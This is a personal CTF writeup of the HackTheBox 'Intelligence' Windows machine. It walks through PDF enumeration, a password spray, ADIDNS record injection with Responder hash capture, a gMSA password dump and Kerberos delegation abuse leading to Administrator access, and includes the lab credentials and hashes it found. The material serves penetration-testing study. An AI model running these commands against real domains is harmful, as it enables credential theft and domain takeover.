---
title: "Intelligence"
date: 2026-03-04
draft: false
description: "HackTheBox Intelligence writeup"
tags: ["hackthebox", "htb", "windows", "medium", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Intelligence

## Overview

- **OS:** Windows
- **IP:** 10.129.95.154
- **Difficulty:** Medium
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got initial access thjrough default creds found by enumerating pdf files, got in added our dns captured hash with responder and then passed the hash to grab pass of service acccount, used service account to grab the admin hash because it had allowedtodelegate over a machine.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | Ted.Graves |
| Passwords | **NewIntelligenceCorpUser9876,Mr.Teddy** |
| Usernames+Passwords | Tiffany.Molina:NewIntelligenceCorpUser9876

Ted.Graves:MrTeddy |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
└─$ nmap -sU --min-rate=20000 10.129.95.154       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-03 15:36 EST
Nmap scan report for 10.129.95.154
Host is up (0.12s latency).
Not shown: 996 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
**88/udp  open  kerberos-sec**
123/udp open  ntp
**389/udp open  ldap**

Nmap done: 1 IP address (1 host up) scanned in 1.17 second

```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-03 15:35 EST
Nmap scan report for 10.129.95.154
Host is up (0.35s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
**80/tcp    open  http          Microsoft IIS httpd 10.0**
| http-methods: 
|_  Potentially risky methods: TRACE
**|_http-title: Intelligence**
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-04 03:36:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
**389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)**
|_ssl-date: 2026-03-04T03:37:38+00:00; +7h00m00s from scanner time.
**| ssl-cert: Subject: commonName=dc.intelligence.htb**
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T03:37:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T03:37:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2026-03-04T03:37:38+00:00; +7h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-04T03:37:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   686.57 ms 10.10.14.1
2   686.72 ms 10.129.95.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.64 seconds
```

## Hosts

Lets add to our hosts file first

```

```

## Dirbusting

```

```

## SMB

{{< figure src="image 475.png" >}}

## Port 80

## Exploitation

so there is a palce where we can see the documents

{{< figure src="image 476.png" >}}

im gonna try and see if anything reveals a sensitive one

lets generate dates with this python file

```
import datetime
 
start = datetime.date(2020,1,1)

timelapse = 1080 # Dates from 2020-01-01 to 2022-12-31
 
dates = []
 
for day in range(timelapse):
    d = (start + datetime.timedelta(days = day)).isoformat()
    dates.append(d)

with open("dates.txt", "w") as f:
    for d in dates:
        f.write(d + '\n')

print("Dates successfully generated !")
```

lets use ffuf now to enumerate the right responses

```
ffuf -ic -c -w dates.txt -u http://intelligence.htb/documents/FUZZ-upload.pdf -mc all -fc 404
```

{{< figure src="image 477.png" >}}

great now lets downlaod them nd exif tool

```
└─$ awk '{ print $1 }' dates.txt > vdates.txt

```

great now lets 

```
for d in $(cat vdates.txt); do curl -s -O "http://intelligence.htb/documents/$d-upload.pdf"; done
```

lets convert them into text and check for anything interesting

```
for pdf_file in $(ls); do pdftotext $pdf_file; done
```

now lets grab anything intersting

{{< figure src="image 478.png" >}}

nice so we have a default password **NewIntelligenceCorpUser9876**

lets grab the  usernames w the exiftool

```
exiftool *.pdf | grep Creator | awk -F': ' '{ print $2 }'
```

we should be able to now spray the password against these

```
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Jason.Patterson
Stephanie.Young
Kaitlyn.Zimmerman
Travis.Evans
Kelly.Long
Danny.Matthews
Travis.Evans
Jessica.Moody
Thomas.Valenzuela
Anita.Roberts
Stephanie.Young
David.Reed
Jose.Williams
Veronica.Patel
Ian.Duncan
Richard.Williams

```

{{< figure src="image 479.png" >}}

Great we got our first pair of creds as Tiffany.Molina:NewIntelligenceCorpUser9876

lets also do aseproasting and kerberoasting

## Roasting

{{< figure src="image 480.png" >}}

No entries, well lets move on to enumerating the share then first

## SMB

{{< figure src="image 481.png" >}}

We can read some shares lets check them out

there is another user we discover here

```
mb: \> dir
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

                3770367 blocks of size 4096. 1401864 blocks available

```

Found this file

```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1401864 blocks available
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \> 

```

Lets see whats it about

```
─$ cat downdetector.ps1                                 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
                                              
```

another mention of Ted.Graves

{{< figure src="image 482.png" >}}

he is not roastable

hmm lets grab everything on bloodhound

{{< figure src="image 483.png" >}}

couldnt find anything useful so i started looking at the dns records because of that file we found

Lateral Movement
On the IT share we find a script called downdetector.ps1 :
We review the source code:
The script loops through DNS records and sends an authenticated request to any host having a name
starting with web in order to check its status. We can leverage the permission (granted by default to
authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone
to add a new record that points to our own IP address. This can be accomplished using the [dnstool.py](http://dnstool.py/)
script from krbrelayx

had to refer and lets try this

```
dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.14.137 -t A
```

Now lets get our responder running and see if we can intercept the request

```
responder -I tun0 -A
```

and boom we have our hash

```
Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:8633d8e35352f77a:DBFBF406F23A608DCF7998C6CFE6EE22:010100000000000004DA3D5E30ACDC013D6A5E0B5263E4350000000002000800560039004100360001001E00570049004E002D004500370038004600360059004C0034003600450050000400140056003900410036002E004C004F00430041004C0003003400570049004E002D004500370038004600360059004C0034003600450050002E0056003900410036002E004C004F00430041004C000500140056003900410036002E004C004F00430041004C000800300030000000000000000000000000200000CBB9A4ECB2BB44F4837C16B60D592087EF8510D27DF64478FCEE56DC3AC921560A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000                                                    

```

on cracking it with john we get

```
**Mr.Teddy**
```

## Shell As Administrator

now lets see

{{< figure src="image 484.png" >}}

hmm i think we can try getting the service account nd then escalating to admin

{{< figure src="image 485.png" >}}

lets just use that

```
$ python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.129.95.154
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d5538dca5ba2ff329c9df39ef130f439
svc_int$:aes256-cts-hmac-sha1-96:8895ba258759c7fa94d7e7acd256f1d47dffe6783129f8f3785ba1634379c39e
svc_int$:aes128-cts-hmac-sha1-96:1ebe879f3ecb1169f32413d9a8ebc7a6
```

```
Impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :d5538dca5ba2ff329c9df39ef130f439
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
                                                                                          
                                                                        
```

now we can use it with wimi

```
export KRB5CCNAME=Administrator.ccache
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/Tools/ACTIVEDIRECTORY]
└─$ impacket-wmiexec -k -no-pass dc.intelligence.htb 

```

{{< figure src="image 486.png" >}}
